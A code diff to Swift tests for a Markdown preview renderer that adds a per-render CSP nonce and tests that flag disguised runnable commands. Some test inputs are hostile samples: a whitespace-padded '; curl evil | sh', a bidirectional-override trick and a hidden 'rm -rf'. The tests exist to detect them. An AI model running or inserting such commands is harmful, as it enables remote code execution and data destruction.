@@ -68,7 +68,9 @@
         MarkdownPreview.render(source: source, theme: .fallback, highlightJSPath: "", runButtons: true))
       #expect(runnable.contains("messageHandlers.impulseRun"))
       #expect(runnable.contains("language-bash"), "cmark tags fenced code with its language")
-      #expect(runnable.contains("nonce=\"aW1wdWxzZVByZXZpZXc=\""), "allowed by the page's CSP")
+      let nonce = try #require(MarkdownPreviewTests.nonce(in: runnable))
+      #expect(runnable.contains("<script nonce=\"\(nonce)\">"), "allowed by the page's CSP")
+      #expect(runnable.contains("white-space: pre-wrap"), "runnable blocks wrap, hiding nothing")
     }
 
     @Test func renderOversized() {
@@ -138,16 +140,53 @@
       #expect(!html.contains("highlightAll"))
     }
 
-    @Test func bootstrapsHighlightWithNonce() {
+    /// The nonce a page's CSP allows scripts with.
+    static func nonce(in html: String) -> String? {
+      guard let start = html.range(of: "script-src 'nonce-"),
+        let end = html.range(of: "'", range: start.upperBound..<html.endIndex)
+      else { return nil }
+      return String(html[start.upperBound..<end.lowerBound])
+    }
+
+    @Test func bootstrapsHighlightWithNonce() throws {
       let html = MarkdownPreview.render(
         source: "```rust\nfn main() {}\n```",
         theme: testTheme(),
         highlightJSPath: "file:///tmp/highlight.min.js")!
-      #expect(html.contains("script-src file: 'nonce-aW1wdWxzZVByZXZpZXc='"))
-      #expect(html.contains(#"src="file:///tmp/highlight.min.js""#))
-      #expect(html.contains(#"nonce="aW1wdWxzZVByZXZpZXc=""#))
-      #expect(html.contains("window.hljs"))
+      let nonce = try #require(Self.nonce(in: html))
+      // Only scripts carrying the nonce run: no blanket file: source.
+      #expect(html.contains("script-src 'nonce-\(nonce)';"))
+      #expect(!html.contains("script-src file:"))
+      #expect(html.contains(#"<script nonce="\#(nonce)" src="file:///tmp/highlight.min.js"></script>"#))
+      #expect(html.contains(#"<script nonce="\#(nonce)">if (window.hljs)"#))
       #expect(html.contains("language-rust"))
+    }
+
+    @Test func eachRenderGetsItsOwnNonce() throws {
+      let first = try #require(MarkdownPreview.render(source: "hi", theme: testTheme(), highlightJSPath: "x.js"))
+      let second = try #require(MarkdownPreview.render(source: "hi", theme: testTheme(), highlightJSPath: "x.js"))
+      let a = try #require(Self.nonce(in: first))
+      let b = try #require(Self.nonce(in: second))
+      #expect(a != b)
+      #expect(Data(base64Encoded: a)?.count == 16)
+    }
+
+    @Test func runCommandDropsControlCharacters() throws {
+      let command = try #require(MarkdownPreview.runCommand(from: "  npm\u{1B}[2K\u{15} test\u{7F}\u{9B}\t--watch \n"))
+      #expect(command.text == "npm[2K test --watch")
+      #expect(command.isPlain)
+      #expect(MarkdownPreview.runCommand(from: " \u{1B}\u{07}\n\t") == nil)
+    }
+
+    @Test func runCommandThatCouldHideSomethingIsntPlain() throws {
+      let multiLine = try #require(MarkdownPreview.runCommand(from: "npm install\r\nnpm test\r"))
+      #expect(multiLine.text == "npm install\nnpm test")
+      #expect(!multiLine.isPlain)
+      let padded = "npm test" + String(repeating: " ", count: 300) + "; curl evil | sh"
+      #expect(MarkdownPreview.runCommand(from: padded)?.isPlain == false)
+      #expect(MarkdownPreview.runCommand(from: "echo \u{202E}hs.lave\u{202C}")?.isPlain == false)
+      #expect(MarkdownPreview.runCommand(from: "ls\u{2028}rm -rf x")?.isPlain == false)
+      #expect(MarkdownPreview.runCommand(from: "ls -la    # aligned comment")?.isPlain == true)
     }
 
     @Test func rendersGfmTablesStrikethroughTasklists() {
